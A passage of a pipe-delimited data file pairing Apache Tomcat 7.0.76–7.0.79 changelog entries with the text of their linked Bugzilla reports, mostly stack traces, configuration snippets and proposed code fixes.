javax.annotation.PreDestroy
javax.annotation.Priority
javax.annotation.Resources
javax.annotation.security.DeclareRoles
javax.annotation.security.DenyAll
javax.annotation.security.PermitAll
javax.annotation.security.RolesAllowed
javax.annotation.security.RunAs"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61145
Other|Tomcat 7.0.79 (violetagg)|fix|61146|Add missing lookup() method to @EJB annotation in the annotations API. Patch provided by Katya Todorova. (markt)|javax.ejb.EJB doesn't contain lookup method|"Created attachment 35027 [details]
Patch validated against tomcat tests and the corresponding specification

According to 
https://docs.oracle.com/javaee/7/api/javax/ejb/EJB.html

javax.ejb.EJB should have lookup method"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61146
Other|Tomcat 7.0.79 (violetagg)|fix||Correct typo in Context Container Configuration Reference. Patch provided by Katya Todorova. (violetagg)|||
General|Tomcat 7.0.78 (violetagg)|add||Allow to exclude JUnit test classes using the build property test.exclude and document the property in BUILDING.txt. (rjung)|||
Catalina|Tomcat 7.0.78 (violetagg)|fix||Review those places where Tomcat re-encodes a URI or URI component and ensure that that correct encoding (path differs from query string) is applied and that the encoding is applied consistently. (markt)|||
Catalina|Tomcat 7.0.78 (violetagg)|fix||Use a more reliable mechanism for the DefaultServlet when determining if the current request is for custom error page or not. (markt)|||
Catalina|Tomcat 7.0.78 (violetagg)|fix||Ensure that when the Default or WebDAV servlets process an error dispatch that the error resource is processed via the doGet() method irrespective of the method used for the original request that triggered the error. (markt)|||
Catalina|Tomcat 7.0.78 (violetagg)|fix||If a static custom error page is specified that does not exist or cannot be read, ensure that the intended error status is returned rather than a 404. (markt)|||
Catalina|Tomcat 7.0.78 (violetagg)|fix||When the WebDAV servlet is configured and an error dispatch is made to a custom error page located below WEB-INF, ensure that the target error page is displayed rather than a 404 response. (markt)|||
Catalina|Tomcat 7.0.78 (violetagg)|add|61047|Add MIME mapping for woff2 fonts in the default web.xml. Patch provided by Justin Williamson. (violetagg)|Missing MIME type for woff2 fonts|"According to WC3, the mime-type for .woff2 fonts should be font/woff2 according the specification released in 2016 (source:
 https://www.w3.org/TR/WOFF2/#IMT); however this is currently unregistered in conf/web.xml.

This affects all versions of Tomcat, including 9.x/trunk."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61047
Catalina|Tomcat 7.0.78 (violetagg)|fix||Correct the logic that selects the encoding to use to decode the query string in the SSIServletExternalResolver so that the useBodyEncodingForURI attribute of the Connector is correctly taken into account. (markt)|||
Catalina|Tomcat 7.0.78 (violetagg)|fix|61072|Respect the documentation statements that allow using the platform default secure random for session id generation. (remm)|SessionIdGeneratorBase will not use platform default SecureRandom algorithm for empty secureRandomAlgorithm attribute|"Setting secureRandomAlgorithm to an empty string and not specifying secureRandomProvider still seems to lead to SessionIdGeneratorBase creating its SecureRandom instance using SecureRandom.getInstance(""SHA1PRNG""), which is contrary to the wording in the documentation saying ""To specify that the platform default should be used, do not set the secureRandomProvider attribute and set this attribute to the empty string."". See the implementation of SessionIdGeneratorBase.createSecureRandom(), where the ""result = new SecureRandom()"" line doesn't seem to be triggered for this case (secureRandomProvider=null, secureRandomAlgorithm="""").

Getting the platform default SecureRandom algorithm is wanted on Linux systems where /dev/random blocks or is slow, either due to misconfiguration or exhaustion. See the latest comment on http://bugs.java.com/view_bug.do?bug_id=4705093 for a description of the current SecureRandom behavior. Regardless of that problem, and the motivation it provides for being able to easily get a default algorithm SecureRandom, I believe the former paragraph describes either a documentation or implementation bug in itself, so unless requested I don't think it's necessary to prove in this bug entry that Tomcat hangs on such a system. (Though it could be argued that platform default SecureRandom would be a better default to make Tomcat never block on /dev/random out-of-the-box.)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61072
Catalina|Tomcat 7.0.78 (violetagg)|fix||Correct the javadoc for o.a.c.connector.CoyoteAdapter#parseSessionCookiesId. Patch provided by John Andrew (XUZHOUWANG) via Github. (violetagg)|||
Jasper|Tomcat 7.0.78 (violetagg)|fix|60925|Improve the handling of access to properties defined by interfaces when a BeanELResolver is used under a SecurityManager. (markt)|Running with SecurityManager - Property 'serverInfo' not found on type org.apache.catalina.core.ApplicationContextFacade|"Created attachment 34884 [details]
localhost.2017-03-28.log

Noted when smoke-testing 8.5.13 RC, but this is reproducible with released 8.5.12 as well, so it is not a regression.

Steps to reproduce:
1. Start Tomcat 8.5 with security manager enabled
catalina.bat start -security

2. Access the root page,
http://localhost:8080/

It fails with error 500.
Stacktrace from 8.5.13:

javax.el.PropertyNotFoundException: Property 'serverInfo' not found on type org.apache.catalina.core.ApplicationContextFacade
 at javax.el.BeanELResolver$BeanProperties.get(BeanELResolver.java:259)
 at javax.el.BeanELResolver$BeanProperties.access$300(BeanELResolver.java:212)
 at javax.el.BeanELResolver.property(BeanELResolver.java:346)
 at javax.el.BeanELResolver.getValue(BeanELResolver.java:92)
 at org.apache.jasper.el.JasperELResolver.getValue(JasperELResolver.java:110)
 at org.apache.el.parser.AstValue.getValue(AstValue.java:169)
 at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:184)
 at org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(PageContextImpl.java:944)
 at org.apache.jsp.index_jsp._jspService(index_jsp.java:155)

See attached file with full stacktrace.


Notes:
1. This does not happen when running without SecurityManager.
2. This does not depends on version of java (occurs both with 7u80 and 8u121).


I have seen similar errors when we were fixing CVE-2014-7810
(see thread from 2014-11-17), but it should have been fixed by r1644017
that improved javax.el.BeanELResolver."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60925
WebSocket|Tomcat 7.0.78 (violetagg)|fix|61003|Ensure the flags for reading/writing in o.a.t.websocket.AsyncChannelWrapperSecure are correctly reset even if some exceptions occurred during processing. (markt/violetagg)|Secure Websocket client hides Exception on error, and throws an IllegalStateException instead|"Created attachment 34924 [details]
The stack trace

We encounter the following exception (full stack attached) instead of a proper exception, such as a time out:

java.lang.IllegalStateException: Concurrent write operations are not permitted
	at org.apache.tomcat.websocket.AsyncChannelWrapperSecure.write(AsyncChannelWrapperSecure.java:116)

AsyncChannelWrapperSecure javadoc interestingly states ""This needs a lot more testing before it can be considered robust."", and indeed this class seems to be the cause of the issue. More details about what I suspect is going on:


If you take a closer look at WsRemoteEndpointImplBase.sendMessageBlock line 313, you will find this section:

         for (MessagePart mp : messageParts) {
            writeMessagePart(mp);
            if (!bsh.getSendResult().isOK()) {
                messagePartInProgress.release();
                Throwable t = bsh.getSendResult().getException();
 // Bug alert!! Here we will write again, but may not have reset the writing flag of AsyncChannelWrapperSecure to false 
                wsSession.doClose(new CloseReason(CloseCodes.GOING_AWAY, t.getMessage()),
                        new CloseReason(CloseCodes.CLOSED_ABNORMALLY, t.getMessage()));
                throw new IOException (t);
            }

which is problematic: The writeMessagePart method will eventually call doWrite of WsRemoteEndpointImplClient, which will simply return in case of exceptions:

  try {
                channel.write(byteBuffer).get(timeout, TimeUnit.MILLISECONDS);
            } catch (InterruptedException | ExecutionException | TimeoutException e) {
                handler.onResult(new SendResult(e));
                return;
            }

So here, when the get fails, the  WriteTask of AsyncChannelWrapperSecure, will not have finished, and so will not have unset its write flag, meaning that the wsSession.doClose call done in WsRemoteEndpointImplBase.sendMessageBlock will fail to write. 
Moreover, the write flag of the WriteTask is not reset in the finally block, meaning that any other exception thrown by the write task will cause the completion of the future, but will not allow to write in the ws either, causing another failure.

This will mean that it will fail to throw the actual cause of the exception stored in the SendResult.


Side Note: the ReadTask seems to suffer of the same disease, not sure if it is immune to it."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61003
Web applications|Tomcat 7.0.78 (violetagg)|add||Document the property test.excludePerformance in BUILDING.txt. (rjung)|||
Web applications|Tomcat 7.0.78 (violetagg)|add||Add documents for maxIdleTime attribute to Channel Receiver docs. (kfujino)|||
jdbc-pool|Tomcat 7.0.78 (violetagg)|code||Refactor the creating a constructor for a proxy class to reduce duplicate code. (kfujino)|||
jdbc-pool|Tomcat 7.0.78 (violetagg)|fix||In StatementFacade, the method call on the statements that have been closed throw SQLException rather than NullPointerException. (kfujino)|||
Other|Tomcat 7.0.78 (violetagg)|fix||Correct comments about Java 8 in Jre8Compat. Patch provided by fibbers via Github. (violetagg)|||
Other|Tomcat 7.0.78 (violetagg)|fix|60932|Correctly escape single quotes when used in i18n messages. Based on a patch by Michael Osipov. (markt)|Invalid or incomplete escaping of apostrophe (') in messages passed to MessageFormat|"Created attachment 34885 [details]
Apostrophe escaping

Based on: https://github.com/apache/tomcat85/pull/7#discussion_r108534666

Several messages passed to MessageFormat include apostrophes which are interpreted by MF, unfortunately they are not escaped which means -- according to Javadoc -- the content between is printed literally. Two single quotes escape to one single quote after interpolation.

See attached patched for updated properties files. Changes apply only to messages which contain format elements. Please review and say whether updated strings are now as intended. 

Patch done of Tomcat 8.5 trunk."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60932
Catalina|Tomcat 7.0.77 (violetagg)|add|54618|Add support to the HttpHeaderSecurityFilter for the HSTS preload parameter. (markt)|Add filter implementing HTTP Strict Transport Security (HSTS) [PATCH]|"Created attachment 30000 [details]
The actual filter

The specification for HTTP Strict Transport Security (HSTS) has now been published (RFC 6797). Tomcat should include a filter implementing the specification to make it easy to add to web applications.

I have attached an implementation suggestion."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54618
Catalina|Tomcat 7.0.77 (violetagg)|fix|60911|Ensure NPE will not be thrown when looking for SSL session ID. Based on a patch by Didier Gutacker. (violetagg)|"NullpointerException in CoyoteAdapter.parseSessionSslId when using secure=""true"" on ajp-Connector"|"Prerequisits

enable the use of SSLSessionIds on an Apache HTTPD and tomcat (connected via ajp protocol with Apache HTTPD as TLS connection endpoint):

1. server.xml
 <Connector address=""xx.xxx.xxx.xx"" port=""8009"" protocol=""AJP/1.3""
               redirectPort=""8443"" enableLookups=""false"" secure=""true"" />

2. mod_jk.conf:

JkExtractSSL On
JkSESSIONIndicator SSL_SESSION_ID

Some clients (for example safari, internet explorer 11, curl) are able to issue get requests to our application getting a http 200 response. Some clients (firefox 52, chrome, SoapUI 5.2.1) are getting a http 500 response.

Further investigation shows this stacktrace in our catalina.out log:
Mar 23, 2017 6:45:52 PM org.apache.coyote.ajp.AjpProcessor process
SEVERE: Error processing request
java.lang.NullPointerException
        at org.apache.catalina.connector.CoyoteAdapter.parseSessionSslId(CoyoteAdapter.java:909)
        at org.apache.catalina.connector.CoyoteAdapter.postParseRequest(CoyoteAdapter.java:692)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:403)
        at org.apache.coyote.ajp.AjpProcessor.process(AjpProcessor.java:193)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:607)
        at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:313)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)

This is caused by a missing sslsessionId in this code:
request.setRequestedSessionId(request.getAttribute(SSLSupport.SESSION_ID_KEY).toString());

A close look with a debugger shows that the request attribute is not present and this leads to a NullpointerException because of the toString() method call on a null value.

Further reading in RFC 5077 section 3.4 (see https://tools.ietf.org/html/rfc5077#section-3.4) leads us to the conclusion that the client decides if it wants to include the session id in the request or not.
Thus the parseSessionSslId method should be aware of the possibility that the session id might be missing.

I think the Code in the parseSessionSslId method should look like this:
String sessionId = request.getAttribute(SSLSupport.SESSION_ID_KEY);
request.setRequestedSessionId(sessionId == null ?  sessionId : sessionId.toString());

Deeper investigation shows that this problem exists in tomcat 8 and 9 too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60911
Coyote|Tomcat 7.0.77 (violetagg)|fix||When using the NIO2 connector, ensure a WebSocket close frame is processed before the end of stream is processed to ensure that the end of stream is processed correctly. (markt)|||
Coyote|Tomcat 7.0.77 (violetagg)|fix|60852|Correctly spell compressible when used in configuration attributes and internal code. Based on a patch by Michael Osipov. (markt)|Connector property compressableMimeType incorrectly spelled|"The word ""compressable"" does not exist according to Merriam Webster or the Oxford Dictionary. It seems simply to be a typo:

> $ grep -ri --exclude-dir=.svn compressable .
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:    private String compressableMimeType = ""text/html,text/xml,text/plain,text/css,text/javascript,application/javascript,application/json,application/xml"";
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:    private String[] compressableMimeTypes = null;
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:    public String getCompressableMimeType() { return compressableMimeType; }
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:    public void setCompressableMimeType(String valueS) {
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:        compressableMimeType = valueS;
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:        compressableMimeTypes = null;
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:    public String[] getCompressableMimeTypes() {
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:        String[] result = compressableMimeTypes;
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:        StringTokenizer tokens = new StringTokenizer(compressableMimeType, "","");
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:        compressableMimeTypes = result;
> ./java/org/apache/coyote/http11/AbstractHttp11Protocol.java:        processor.setCompressableMimeTypes(getCompressableMimeTypes());
> ./java/org/apache/coyote/http11/Http11Processor.java:    protected String[] compressableMimeTypes;
> ./java/org/apache/coyote/http11/Http11Processor.java:     * @param compressableMimeTypes MIME types for which compression should be
> ./java/org/apache/coyote/http11/Http11Processor.java:    public void setCompressableMimeTypes(String[] compressableMimeTypes) {
> ./java/org/apache/coyote/http11/Http11Processor.java:        this.compressableMimeTypes = compressableMimeTypes;
> ./java/org/apache/coyote/http11/Http11Processor.java:    private boolean isCompressable() {
> ./java/org/apache/coyote/http11/Http11Processor.java:            if (compressableMimeTypes != null) {
> ./java/org/apache/coyote/http11/Http11Processor.java:                return (startsWithStringArray(compressableMimeTypes,
> ./java/org/apache/coyote/http11/Http11Processor.java:        boolean isCompressable = false;
> ./java/org/apache/coyote/http11/Http11Processor.java:            isCompressable = isCompressable();
> ./java/org/apache/coyote/http11/Http11Processor.java:            if (isCompressable) {
> ./java/org/apache/coyote/http11/Http11Processor.java:        if (isCompressable) {
> ./webapps/docs/config/http.xml:    <attribute name=""compressableMimeType"" required=""false"">

A fix is fairly easy, but would require an incompatible change. This is possible in Tomcat 9 only. For Tomcat 8.5.x one could introduce new methods (getter, setter) calling old ones, mark as @Deprecated and change http.xml for the new one only. Old config should continue to run as expected."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60852
Coyote|Tomcat 7.0.77 (violetagg)|fix||Improve sendfile handling when requests are pipelined. (markt)|||
Jasper|Tomcat 7.0.77 (violetagg)|fix||Improve the error handling for simple tags to ensure that the tag is released and destroyed once used. (remm, violetagg)|||
Jasper|Tomcat 7.0.77 (violetagg)|fix|60844|Correctly handle the error when fewer parameter values than required by the method are used to invoke an EL method expression. Patch provided by Daniel Gray. (markt)|ArrayIndexOutOfBoundsException when matching actionListener|"Created attachment 34814 [details]
SVN diff of fix on Apache Tomcat 8.5.x-trunk repo

The bug manifested itself when I:
1. Created a custom composite control in JSF.
2. *ERRONEOUSLY* Defined an attribute with a method signature of ""void actionListener(object)"" -- it should have been ""void actionListener(javax.faces.event.AjaxBehaviorEvent)"".
3. Trigger a call on the method through JSF.

When matching the method signature, org.apache.el.util.ReflectionUtil throws an ArrayIndexOutOfBoundsException at line 210.

The bug is due to is missing check that paramValues is empty (it only checks if it is not null, and then proceeds to evaluate paramValues[i]). I have downloaded & compiled the Apache Tomcat 8.5.x trunk code, fixed the bug, and tested it by running my app inside the servlet, and it now correctly gives an error about it not finding the desired method that I have bound to the argument.

*IMPROVEMENT SUGGESTION*:

The exception or error message should be more explicit about that EL first looks for a method by the name and then the property. I got really mad after a while wondering *WHY IS IT LOOKING FOR THE PROPERTY IF I EXPLICITLY SAID IT WAS A METHOD?!?!?*, which led to the tinkering with the signature, which led to the small bug discovery. It's just that it's not obvious (from outside) what Tomcat is doing and I think it would be nice to indicate that somehow."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60844
jdbc-pool|Tomcat 7.0.77 (violetagg)|fix|60764|Implement equals() and hashCode() in the StatementFacade in order to enable these methods to be called on the closed statements if any statement proxy is set. This behavior can be changed with useStatementFacade attribute. (kfujino)|SlowQueryReport causing connection leak|"Tomcat versions: 8.5.11, 7.0.75

I have a project that uses hibernate with optimistic locking and whenever it tries to do a rollback after an optimistic lock exception, the connection remains active and is not returned to the pool.  This only happens when I have the SlowQueryReport interceptor configured on my JDBC datasource in server.xml.  Here is the relevant stack trace:

20:06:59.566 level:DEBUG class:org.springframework.orm.jpa.EntityManagerFactoryUtils principal: Unexpected exception on closing JPA EntityManager
java.lang.reflect.UndeclaredThrowableException: null
	at com.sun.proxy.$Proxy40.hashCode(Unknown Source)
	at java.util.HashMap.hash(HashMap.java:338)
	at java.util.HashMap.get(HashMap.java:556)
	at org.hibernate.resource.jdbc.internal.ResourceRegistryStandardImpl.release(ResourceRegistryStandardImpl.java:76)
	at org.hibernate.engine.jdbc.batch.internal.AbstractBatchImpl.releaseStatements(AbstractBatchImpl.java:157)
	at org.hibernate.engine.jdbc.batch.internal.AbstractBatchImpl.release(AbstractBatchImpl.java:195)
	at org.hibernate.engine.jdbc.internal.JdbcCoordinatorImpl.close(JdbcCoordinatorImpl.java:190)
	at org.hibernate.internal.SessionImpl.close(SessionImpl.java:424)
	at org.hibernate.jpa.internal.EntityManagerImpl.close(EntityManagerImpl.java:145)
	at org.springframework.orm.jpa.EntityManagerFactoryUtils.closeEntityManager(EntityManagerFactoryUtils.java:438)
	at org.springframework.orm.jpa.JpaTransactionManager.doCleanupAfterCompletion(JpaTransactionManager.java:602)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.cleanupAfterCompletion(AbstractPlatformTransactionManager.java:1016)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:811)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:730)
	at org.springframework.transaction.interceptor.TransactionAspectSupport.commitTransactionAfterReturning(TransactionAspectSupport.java:485)
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:291)
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)
	at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:208)
	at com.sun.proxy.$Proxy215.test(Unknown Source)
	at com.sony.snei.mm.quartz.job.AbstractCategoryLayoutJob$1.run(AbstractCategoryLayoutJob.java:71)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.sql.SQLException: Statement closed.
	at org.apache.tomcat.jdbc.pool.interceptor.AbstractQueryReport$StatementProxy.invoke(AbstractQueryReport.java:226)
	... 22 common frames omitted


The problem is that hashCode() is called on the connection after it has been closed and that causes StatementProxy to throw the ""Statement closed"" exception.  I think that it should allow hashCode() and equals() to be called on the delegate even after the connection is closed.

Thanks,
Mark"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60764
Catalina|Tomcat 7.0.76 (markt)|code||Make it easier for sub-classes of Tomcat to modify the default web.xml settings by over-riding getDefaultWebXmlListener(). Patch provided by Aaron Anderson. (markt)|||
Catalina|Tomcat 7.0.76 (markt)|fix||Reduce the contention in the default InstanceManager implementation when multiple threads are managing objects and need to reference the annotation cache. (markt)|||
Catalina|Tomcat 7.0.76 (markt)|code|60674|Remove final marker from CorsFilter to enable sub-classing. (markt)|Allow subclassing of org.apache.catalina.filters.CorsFilter|"1) why is the class ""final""?
  ==> pls remove that

Similarly, please make the variables like allowedHttpHeaders ""protected"" instead of ""private final"" or is there some ""rationale"" behind this (coding guidelines mandating this)?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60674
Catalina|Tomcat 7.0.76 (markt)|fix|60683|Security manager failure causing NPEs when doing IO on some JVMs. (csutherl)|Using the IBM JDK with the security manager results in a NullPointerException for requests to some JSPs|"When using the IBM JDK (version 7) and the security manager requests to some JSPs return a 500 status and an NPE is logged. The odd thing is that you can make numerous requests to / and get a 500 every time, but after you make a request to /examples/jsp/dates/date.jsp, everything works fine. I'm not exactly sure what's causing that, but IBM JDK is weird so...

Steps to reproduce:

1. ./catalina.sh start -security

2. Make a request:

$ curl -I http://localhost:8080/ | head -n1
HTTP/1.1 500 Internal Server Error

3. Check the catalina.out log for the following:

java.lang.NullPointerException
	at org.apache.catalina.connector.OutputBuffer.realWriteChars(OutputBuffer.java:464)
	at org.apache.tomcat.util.buf.CharChunk.flushBuffer(CharChunk.java:393)
	at org.apache.catalina.connector.OutputBuffer.close(OutputBuffer.java:279)
        ....

Additional information:

I narrowed down the problem to an unexpected access denial exception being returned from OutputBuffer:583:

583        conv = encoders.get(enc);
584        if (conv == null) {
585            if (Globals.IS_SECURITY_ENABLED){

I added a try/catch and e.printStackTrace() and found the following exception happens within the encoders.get() call on line 583 ONLY when using IBM JDK:

java.security.AccessControlException: Access denied (""java.lang.RuntimePermission"" ""accessClassInPackage.org.apache.tomcat.util.buf"")
        at java.security.AccessController.throwACE(AccessController.java:121)
        at java.security.AccessController.checkPermission(AccessController.java:230)
        at java.lang.SecurityManager.checkPermission(SecurityManager.java:563)
        at java.lang.SecurityManager.checkPackageAccess(SecurityManager.java:1617)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:323)
        at java.lang.ClassLoader.loadClassHelper(ClassLoader.java:778)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:760)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:741)
        at org.apache.catalina.connector.OutputBuffer.setConverter(OutputBuffer.java:586)
        ....

Knowing the exception it was pretty easy to fix with a policy update, but I'm opening this bug because I don't know if this is feasible or not (I don't know the security policy well enough). Changing the catalina.policy's RuntimePermissions on the org.apache.tomcat package from:

    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.tomcat"";

to either:

    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.tomcat.*"";

or (and more targeted to the issue):

    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.tomcat.util.buf"";

works well. Are either of these suggestions a feasible solution?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60683
Catalina|Tomcat 7.0.76 (markt)|fix|60688|Update the internal fork of Apache Commons BCEL to r1782855 to add early access Java 9 support to the annotation scanning code. (markt)|Tomcat should skip or handle module-info.class when scanning for annotations|"Libraries compatible with Java 8 or older may also contain module-info.class compiled for Java 9. Tomcat logs the following message for such libraries:

SEVERE: Unable to process Jar entry [module-info.class] from Jar [file:...../javax.json-1.1.0-M1.jar] for annotations
org.apache.tomcat.util.bcel.classfile.ClassFormatException: Invalid byte tag in constant pool: 19
at org.apache.tomcat.util.bcel.classfile.Constant.readConstant(Constant.java:97)
at org.apache.tomcat.util.bcel.classfile.ConstantPool.<init>(ConstantPool.java:54)
at org.apache.tomcat.util.bcel.classfile.ClassParser.readConstantPool(ClassParser.java:174)
at org.apache.tomcat.util.bcel.classfile.ClassParser.parse(ClassParser.java:83)
at org.apache.catalina.startup.ContextConfig.processAnnotationsStream(ContextConfig.java:2053)
at org.apache.catalina.startup.ContextConfig.processAnnotationsJar(ContextConfig.java:2000)
at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1970)
at org.apache.catalina.startup.ContextConfig.processAnnotations(ContextConfig.java:1923)
at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1163)
at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:775)
at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:299)
at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:94)
at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5087)
at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1419)
at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1409)
at java.util.concurrent.FutureTask.run(FutureTask.java:266)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
at java.lang.Thread.run(Thread.java:745)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60688
Catalina|Tomcat 7.0.76 (markt)|fix|60718|Improve error handling for asynchronous processing and correct a number of cases where the requestDestroyed() event was not being fired and an entry wasn't being made in the access logs. (markt)|requestDestroyed not called for asynchronous after I/O error|"Sequence of events:
1. Servlet ""synchronously"" writes an async response: ac = req.startAsync(); try { resp.getOutputStream().write(new byte[1024*1024]); } finally { ac.complete(); }
2. Client disconnects to force broken pipe (etc.): uc = new URL(""..."").openConnection(); uc.getInputStream().close(); uc.disconnect();

In this case, where ServletRequestListener.requestInitialized is called.  Summary of scenarios:
- Fail: the servlet writes the response synchronously after startAsync (described above)
- Fail: In Tomcat 8.5.11, the servlet writes the response truly asynchronously (with a new Thread)
- Pass: in Tomcat 8.5.6, the servlet writes the response truly asynchronously (with a new Thread)
- Pass: the servlet writes the response truly synchronously (without startAsync)
- Pass: the client reads the stream without disconnecting early (all Tomcat versions, regardless of other scenarios presented).

I think requestDestroyed should always be called."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60718
Catalina|Tomcat 7.0.76 (markt)|fix|60808|Ensure that the Map returned by ServletRequest.getParameterMap() is fully immutable. Based on a patch provided by woosan. (markt)|ServletRequest.getParameterMap() not fully immutable|"A corner case was discovered: if request.getParameterMap().keySet().retainAll(set) is called even after the internal ParameterMap is locked.

Reproducible step:
- Create a simple JSP page like this:
<%
// test.jsp
out.println(""request.getParameterMap(): "" + request.getParameterMap());
request.getParameterMap().keySet().retainAll(java.util.Collections.emptySet());
out.println(""request.getParameterMap(): "" + request.getParameterMap());
%>
- Request the page. e.g, http://localhost:8080/examples/test.jsp?p1=v1&p2=v2
- You will notice the second output is empty.

According to the javadoc of javax.servlet.ServletRequest#getParameterMap(), the returned map must be immutable. But, its #keySet() seems to return a mutable set. It could have returned an unmodifiable set at least like Collections.unmodifiableMap(map) does."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60808
Catalina|Tomcat 7.0.76 (markt)|fix|60824|Correctly cache the Subject in the session - if there is a session - when running under a SecurityManager. Patch provided by Jan Engehausen. (markt)|Subject incorrectly removed from user session|"In our setup we have global security enabled, and we're using Spring Security with a pre-authenticated scenario in the web application.
We're seeing a (very likely platform-indepedent) issue with unexpected javax.security.auth.Subject instances and unexpected java.security.Principal instances contained in those Subject instances. We see each request exposes a new Subject instance, and under load (same user session, concurrent requests) a Principal created by Spring is present in the set of principals of the Subject instance, whilst the Tomcat-managed one is not present.

The problem has been observed on Linux and Windows. We're using the following Java versions:
- Linux: Java(TM) SE Runtime Environment (build 1.8.0_60-b27)
- Windows: Java(TM) SE Runtime Environment (build 1.8.0_31-b13)

Tomcat Connector
Linux:  <Connector URIEncoding=""UTF-8"" scheme=""http"" protocol=""HTTP/1.1"" connectionTimeout=""20000"" port=""...""/>
Windows: Embedded Tomcat 7.0.47 via Maven Tomcat plugin

Tomcat is not used behind Apache HTTPD or any other web server.

We have debugged the issue and believe the cause lies in org.apache.catalina.connector.Request.setUserPrincipal(Principal)
The code in this method tries to cache the Subject in the user session, but (accidentally?) removes it from the session at the beginning of every request.
This is because the variable ""subject"" is always ""null"" when ""session.setAttribute(Globals.SUBJECT_ATTR, subject);"" is called, unless the session did not carry a subject yet.

Further code in Tomcat uses the session to obtain and cache the Subject in the session, e.g. org.apache.catalina.security.SecurityUtil.execute(Method, Object, Object[], Principal). In there, if no Subject is found in the session, a new instance is created with the Principal of the current request, stored in the session and used as the current JAAS subject.
Concurrent requests from the same user session may cause race conditions, as the Subject is removed from the session but also cached by these parts of the code.

We have created a simple reproduceable test, see below, which verifies that the Tomcat-managed principal is found in the Principal set of the current Subject. In error cases, only a Spring-managed Principal is found.
In our actual real-life case, our code relies on Principal objects created by a custom login module, which are sometimes not found, thus causing the real application to fail.

Overview
If global security is enabled and a session exists, the Subject is removed from the session at the beginning of each request.

Reproducer
Find details and how to run at https://github.com/smurf667/test-tomcat-broken-subject
The test setup uses an integration test with an embedded Tomcat to send a number of concurrent requests for a single user session.
A Spring filter in the application makes sure that a Tomcat-managed Principal created is present in the subject. If not, the application fails.

Expected: The Subject present for each request of the same user session contains a Tomcat-managed Principal.
Actual: Sometimes the Subject only contains a Spring-managed Principal.

We're suggesting a potential fix for the issue in the README.md of the repository.
As we're no experts, we leave it to the person handling our bug report to judge if the fix is appropriate or not (we believe so). Please ask if you have any further questions, thanks!

Kind regards,
Sebastian H√§hnel (sebastian.haehnel@gmail.com) and Jan Engehausen (smurf667@gmail.com)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60824
Catalina|Tomcat 7.0.76 (markt)|fix||Ensure request and response facades are used when firing application listeners. (markt/remm)|||
Catalina|Tomcat 7.0.76 (markt)|fix||When HTTP TRACE requests are disabled on the Connector, ensure that the HTTP OPTIONS response from the WebDAV servlet does not include TRACE in the returned Allow header. (markt)|||
Coyote|Tomcat 7.0.76 (markt)|fix||Ensure that executor thread pools used with connectors pre-start the configured minimum number of idle threads. (markt)|||
